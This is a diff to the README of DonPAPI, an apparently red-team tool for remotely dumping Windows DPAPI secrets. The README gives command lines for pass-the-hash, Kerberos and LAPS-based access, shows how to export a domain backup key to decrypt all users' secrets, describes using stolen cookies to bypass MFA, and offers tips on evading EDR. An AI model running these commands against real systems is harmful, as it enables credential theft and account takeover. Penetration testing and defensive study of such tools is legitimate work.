@@ -18,7 +18,8 @@ We aim at locating those "secured" credentials, and retrieve them using :
 
 - Windows credentials (Taskscheduled credentials & a lot more)
 - Windows Vaults
-- Windows RDP credentials 
+- Windows RDP credentials
+- Windows certificates
 - AdConnect (still require a manual operation)
 - Wifi key
 - Internet explorer Credentials
@@ -46,48 +47,64 @@ With local admin account on a host, we can :
 
 With a user password, or the domain PVK we can unprotect the user's DPAPI secrets.  
 
+- Use cookies to bypass MFA (https://www.eshlomo.us/pass-the-cookie-crumble-the-cloud/)
+
 ## Examples
+### Authenticate with 
 
-Dump all secrets of the target machine with an admin account : 
+Dump all secrets of the target machine with an Domain admin account : 
 
 ```bash
-DonPAPI.py domain/user:passw0rd@target
+DonPAPI domain/user:passw0rd@target
+```
+or a Local one : 
+```
+DonPAPI -local_auth user@target
+```
+Using PtH
+
+```bash
+DonPAPI --hashes <LM>:<NT> domain/user@target
 ```
 
-Using user's hash
+Using kerberos (-k)
 
 ```bash
-DonPAPI.py --hashes <LM>:<NT> domain/user@target
-```
-
-Using kerberos (-k) and local auth (-local_auth)
-
-```bash
-DonPAPI.py -k domain/user@target
-DonPAPI.py -local_auth user@target
+DonPAPI -k domain/user@target
 ```
 
 Using a user with LAPS password reading rights
 
 ```bash
-DonPAPI.py -laps domain/user:passw0rd@target
+DonPAPI -laps domain/user:passw0rd@target
 ```
 
-It is also possible to provide the tool with a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.
+Using relayed socks :  
+![HackndoRealying](https://pbs.twimg.com/media/FAnPpHjX0AE16r9?format=jpg&name=medium)
+
+### Decrypt secrets 
+
+to decrypt secrets DonPapi might need :
+- Nothing, when facing reversible encryption (firefox, mremoteNG, VNC)
+- the machine DPAPI Key, we will fetch it automatically thanks to secretdumps when having an admin acces (Wifi, scheduled task passwords)
+- the user password for everything related to DPAPI Protection, or de DPAPI Domain Backup key
+
+It is possible to provide a list of credentials that will be tested on the target. DonPAPI will try to use them to decipher masterkeys.
 
 This credential file must have the following syntax:
 
 ```plain
 user1:pass1
-user2:pass2
+user1:pass2
+user2:passX
 ...
 ```
 
 ```bash
-DonPAPI.py -credz credz_file.txt domain/user:passw0rd@target
+DonPAPI -credz credz_file.txt domain/user:passw0rd@target
 ```
 
-When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool. 
+When a domain admin user is available, it is possible to dump the domain backup key using impacket `dpapi.py` tool: 
 
 ```bash
 dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
@@ -95,31 +112,56 @@ dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
 
 This backup key (pvk file) can then be used to dump all domain user's secrets!
 
-`python DonPAPI.py -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`
+`DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list`
 
-Target can be an IP, IP range, CIDR, file containing list targets (one per line)
+### Select targets
+Target can be an IP, IP range, CIDR, FQDN, file containing list targets (one per line)
+
+## Reports & raw data
+DonPapi will extract and consolidate a bunch of raw information 
+- raw user and passwords in 'raw_credz' 
+- dumped certificates informations
+- raw cookies 
+- raw sam hash
+- raw users masterkey's hash (Good luck with cracking those, but it might be the only hash you'll get for some SuperAdmin Accounts)
+- raw DCC2
+
+HTML Reports will be created, as you'll probably have so many passwords that your browser will crash rendering it, i tried to separate those in few reports.
+
+Cookies are great to bypass MFA, by clicking on a cookie in the report you'll copy what you need to paste to cookie in your browser dev console.
+
+If the certificate allow client authentication, you can click on "Yes" to get a working `certipy auth` command with the certificate in your clipboard.
+
+some info are excluded from the reports, you can still acces all the data in the sqlite3 donpapi.db database.
 
 
 ## Opsec consideration
 
-The RemoteOps part can be spoted by some EDR. It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested. 
+The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested. 
 
 ## Installation
 
 ```
 git clone https://github.com/login-securite/DonPAPI.git
 cd DonPAPI
-python3 -m pip install -r requirements.txt
-python3 DonPAPI.py
+python3 -m pip install .
+DonPAPI
 ```
 
 or
 
 ```
-git clone https://github.com/login-securite/DonPAPI.git
+pip install git+https://github.com/login-securite/DonPAPI.git
+DonPAPI
+```
+
+or
+
+```
+git clone git+https://github.com/login-securite/DonPAPI.git
 cd DonPAPI
-poetry install
-poetry run donpapi
+poetry update
+poetry run DonPAPI
 ```
 
 ## Credits
@@ -137,7 +179,6 @@ All the credits goes to these great guys for doing the hard research & coding :
 
 - Finish ADSync/ADConnect password extraction
 - CREDHISTORY full extraction
-- Extract windows Certificates
 - Further analysis ADAL/msteams
 - Implement Chrome <v80 decoder
 - Find a way to implement Lazagne's great modules
